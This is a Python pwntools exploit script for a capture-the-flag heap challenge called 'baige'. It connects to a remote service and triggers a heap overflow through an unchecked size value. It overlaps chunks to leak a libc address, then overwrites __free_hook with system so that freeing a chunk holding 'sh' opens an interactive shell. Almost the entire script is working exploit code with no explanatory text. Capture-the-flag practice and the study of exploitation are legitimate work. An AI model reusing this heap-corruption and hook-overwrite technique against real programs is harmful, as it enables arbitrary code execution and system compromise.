# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './baige'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '113.201.14.253'
    port = '21111'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(idx , size , text):
    cmd(1)
    sla('idx' , idx)
    sla('size' , size)
    sla('content?' , text)

def delete(idx):
    cmd(2)
    sla('idx' , idx)

def edit(idx , size , text):
    cmd(3)
    sla('idx' , idx)
    sla('size' , size)
    sa('content?' , text)

def show(idx):
    cmd(4)
    sla('idx' , idx)

# one_gad = one_gadget(libc.path)

add( 0 ,0x18, 'a')

cmd(1)
sla('idx' , 0)
sla('size' , 0xffffffff)

add( 1 , 0x20 , 'a')
add( 2 , 0x400 , 'a')
add( 3 , 0x18 , 'a')
add( 4 , 0x18 , 'a')

delete(1)

payload = flat(
    0,0,
    0,0x31,
    0,0,
    0,0,
    0,0x410 + 0x20+1
)

edit(0 , 0x60 ,payload)
delete(2)
add( 5 , 0x400 , 'a')
show(3)
# dbg()

leak = l64() - 0x70
lg('leak',leak)
libc.address = leak - libc.sym['__malloc_hook']

__free_hook = libc.sym['__free_hook']
system = libc.sym['system']
binsh = libc.search('/bin/sh').next()

payload = flat(
    0,0,
    0,0x31,
    __free_hook - 0x8
)
edit(0 , 0x40 , payload )

add( 5 , 0x28 , 'sh\x00')
add( 6 , 0x28 , flat(binsh , system))

delete(5)

p.interactive()

'''
@File    :   baige.py
@Time    :   2021/09/25 11:02:23
@Author  :   Niyah 
'''